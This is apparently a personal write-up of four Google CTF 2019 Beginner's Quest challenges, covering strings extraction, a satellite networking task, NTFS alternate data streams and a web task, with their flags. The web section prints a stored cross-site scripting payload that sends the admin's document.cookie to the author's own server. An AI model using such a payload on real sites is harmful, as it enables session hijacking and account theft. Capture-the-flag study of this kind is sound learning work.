# Google CTF 2019 | Beginner's Quest

## What I have learned
* `strings` is an excellent program that allows for easy extraction of "human-readable" strings from a file.
* Alternate Data Streams exists.
* CTFs are pretty fun.

## Enter Space-Time Coordinates | misc

Ok well done. The console is on. It's asking for coordinates. Beating heavily on the console yields little results, but the only time anything changes on your display is when you put in numbers.. So what numbers are you going to go for?  You see the starship's logs, but is there a manual? Or should you just keep beating the console?

### Solution

The attachment is a zip-file containing a `log.txt` file and a `rand2` binary. The flag `CTF{welcome_to_googlectf}` is hidden within the human-readable characters of the binary. The command `strings rand2 | grep 'CTF'` fetches the flag.

## Satellite | networking

Placing your ship in range of the Osmiums, you begin to receive signals. Hoping that you are not detected, because it's too late now, you figure that it may be worth finding out what these signals mean and what information might be "borrowed" from them. Can you hear me Captain Tim? Floating in your tin can there? Your tin can has a wire to ground control?

Find something to do that isn't staring at the Blue Planet.

### Solution

The attachment is a zip-file containing a `init_sat` program and a pdf. In the PDF there is a picture of a satellite with the text `osmium` painted on the side of it. The program prompts the user for a satellite to connect to and naturally we'll try `osmium`. We connect successfully and we're given three options, one of which displays more information. There, we find [a link](https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E/edit) to a document containing "the remaining config data". The content is Base64-encrypted and decryption yields the following hint:
```
Username: wireshark-rocks
Password: start-sniffing!
```

The packet-response of that same option contains the flag: `CTF{4efcc72090af28fd33a2118985541f92e793477f}`

## Home Computer | forensics

Blunderbussing your way through the decision making process, you figure that one is as good as the other and that further research into the importance of Work Life balance is of little interest to you. You're the decider after all. You confidently use the credentials to access the "Home Computer."

Something called "desktop" presents itself, displaying a fascinating round and bumpy creature (much like yourself) labeled  "cauliflower 4 work - GAN post."  Your 40 hearts skip a beat.  It looks somewhat like your neighbors on XiXaX3.   ..Ah XiXaX3... You'd spend summers there at the beach, an awkward kid from ObarPool on a family vacation, yearning, but without nerve, to talk to those cool sophisticated locals.

So are these "Cauliflowers" earthlings? Not at all the unrelatable bipeds you imagined them to be.  Will they be at the party?  Hopefully SarahH has left some other work data on her home computer for you to learn more.

### Solution [FAIL]

The attachment is a zip-file containing a `family.ntfs` file. Through googling I found out that I could explore it using 7-zip. The obvious first choice was to look through the user directories. There I found `credentials.txt` which contained the string `I keep pictures of my credentials in extended attributes.`.

Not being very well-versed in file-systems, I spent the next hour trying to find out what this meant. A large portion of that was spent trying to figure out how to read system variables through 7-zip. Mounting the file-system didn't help me either.

I looked up the solution and was stunned with that I found. I had no idea that Alternate Data Streams were a thing and am amazed with how weird they are. Now knowing the answer, I believe that I gave up too quickly. While searching for "extended attributes" I found many articles which I now realize mentioned ADSs. I guess patience IS a virtue.

7-zip allows you to read ADSs. Right-clicking `credentials.txt` and choosing `Alternate Streams` opens a new folder with the "file" `FILED`. It's an image containing the flag: `CTF{congratsyoufoundmycreds}`.

## Government Agriculture Network | web

Well it seems someone can't keep their work life and their home life separate. You vaguely recall on your home planet, posters put up everywhere that said "Loose Zips sink large commercial properties with a responsibility to the shareholders." You wonder if there is a similar concept here.

Using the credentials to access this so-called Agricultural network, you realize that SarahH was just hired as a vendor or contract worker and given access that was equivalent. You can only assume that Vendor/Contractor is the highest possible rank bestowed upon only the most revered and well regarded individuals of the land and expect information and access to flow like the Xenovian acid streams you used to bathe in as a child.

The portal picture displays that small very attractive individual whom you instantly form a bond with, despite not knowing. You must meet this entity! Converse and convince them you're meant to be! After a brief amount of time the picture shifts into a biped presumably ingesting this creature! HOW DARE THEY. You have to save them, you have to stop this from happening. Get more information about this Gubberment thing and stop this atrocity.

You need to get in closer to save them - you beat on the window, but you need access to the cauliflower's  host to rescue it.

### Solution

The task contains a [link](https://govagriculture.web.ctfcompetition.com/) that leads to a blog-type page. There are two posts, a submittable text-field, and a nav-bar with a link to `/admin`. Submitted text does not reflect anywhere on the site, but doing so returns the peculiar message `Your post was submitted for review. Administator will take a look shortly.`. This lead me to believe that "someone" will be looking at my message, and that that someone will load my unsanitized message in their browser. Preferably logged in as admin.

I set up a bare-bones web-server using Flask and submitted the following:
```
<script>
document.write("<img src='<my_ip>?cookie=" + document.cookie.toString() + "'/'/>");
</script>
```
The resulting request contained the flag `CTF{8aaa2f34b392b415601804c2f5f0f24e}`.
